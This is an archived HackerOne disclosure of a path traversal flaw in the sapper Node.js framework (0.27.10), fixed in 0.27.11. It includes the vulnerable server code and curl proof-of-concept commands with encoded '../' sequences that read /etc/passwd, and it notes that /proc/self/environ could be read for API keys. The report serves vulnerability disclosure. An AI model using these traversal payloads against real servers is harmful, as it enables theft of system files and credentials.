---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/web
  - stack/node
  - vuln/path-traversal
  - impact/rce
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2020-06-18
submitted: 2020-03-16T14:09:41.426Z
bounty_usd: null
votes: 4
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "anvikha"
source: "https://hackerone.com/reports/820224"
title: "[sapper] Path Traversal"
---
# [sapper] Path Traversal

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 4 | **Program:** Node.js third-party modules | **Disclosed:** 2020-06-18

- Report: [https://hackerone.com/reports/820224](https://hackerone.com/reports/820224)
- CWE: Path Traversal
- Submitted: 2020-03-16T14:09:41.426Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report a critical path traversal vunerability in the sapper module
It allows an attacker to simply obain arbitrary files from the remote server, exploiting a simple path traversal using URL-encoded "../".

# Module

**module name:** sapper
**version:** 0.27.10
**npm page:** `https://www.npmjs.com/package/sapper`

## Module Description

Sapper is a framework for building high-performance universal web apps. Read the guide or the introductory blog post to learn more.

## Module Stats

[6,762] weekly downloads

# Vulnerability

## Vulnerability Description

The vulnerability was found by playing with a sapper / webpack stack while researching vulnerabilities on internal projects. 
I started to dig deeper on how static files were served, and I've noticed that the module allowed a trivial path traversal in its code.

## Steps To Reproduce:

1. Clone https://github.com/sveltejs/sapper-template project
2. `npm i`
3. Use `degit` to obtain the webpack example app: `npx degit "sveltejs/sapper-template#webpack" my-app`
4. `npx sapper dev` - **exploit** with `curl -vv http://localhost:3000/client/750af05c3a69ddc6073a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`
This also works in prod mode with
4. `npx sapper build && node __sapper__build` - **exploit** with `curl -vvv http://localhost:3000/client/750af05c3a69ddc6073a/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd`
 
The reason why the production deployment requires an extra-layer of URL encoding is because this project runs under polka in production, which, contrary to express for example, applies an extra `decodeURIComponent` on the URI.

## Patch

Sapper server simply forms a path with `path.resolve` using the `build_dir` as base directory and the URI-decoded `file` passed in the URL, resulting in a path traversal. 
I am not providing a patch here, but here I've identified the vulnerable code:

sapper/runtime/server.mjs
------------

```
function serve({ prefix, pathname, cache_control }



) {
  const filter = pathname
    ? (req) => req.path === pathname
    : (req) => req.path.startsWith(prefix);

  const cache = new Map();

  const read = dev
    ? (file) => fs.readFileSync(path.resolve(build_dir, file))
    : (file) => (cache.has(file) ? cache : cache.set(file, fs.readFileSync(path.resolve(build_dir, file)))).get(file);

  return (req, res, next) => {
    if (filter(req)) {
    const type = lookup(req.path);

    try {
      const file = decodeURIComponent(req.path.slice(1));
      const data = read(file);

      res.setHeader('Content-Type', type);
      res.setHeader('Cache-Control', cache_control);
      res.end(data);
```

## Supporting Material/References:

- OS: Debian Linux sid
- NodeJS: v10.19.0
- NPM: 6.13.4

# Wrap up

- I contacted the maintainer to let them know: Y
- I opened an issue in the related repository: N - I think this is too severe and impacts too many sites to make it public. 

![geat success](https://media.makeameme.org/created/very-nice-great-j9n9bg.jpg)

## Impact

Any file can be retrieved from the remote server, namely stuff like /proc/self/environ, which would contain any sort of API keys used by the environment the application has been deployed too. This will lead to complete infrastructure RCE and takeover.

## Timeline

- **Report Filed**
- **2020-03-16** @celt: Hi @anvikha,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@celt
- **Report Severity Updated**
- **Report Triaged**
- **2020-04-14** @anvikha: Any news on this? A new version have been pushed to GitHub, with a simple commit message without any official security bulletin or announcement: I don't think this is the proper way to address a vulnerability this serious and give the appropriate credit.
Please inform me.
- **2020-06-05** @anvikha: Guys: I don't think it is cool at all that you reward a researcher with silence: no CVE, no credits; great!
- **2020-06-05** @bbe8482aecd24374d13c5de15a0a6: Hi @anvikha,

sorry, but we have many reports to triage and it takes time for us to handle all reports including the communication.

I will contact the maintainer and invite him to the report so he can check the details and start working on a patch.
- **Report Title Updated**
- **Report Title Updated**
- **External User Joined**
- **2020-06-05** @bbe8482aecd24374d13c5de15a0a6: This is fixed since sapper 0.27.11.
The commit which fixed this is https://github.com/sveltejs/sapper/commit/63ffe9043170fbed8a5d260decfdc05e4440a555

I have found also this advisory: https://www.npmjs.com/advisories/1494

I'm closing this report as resolved.
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
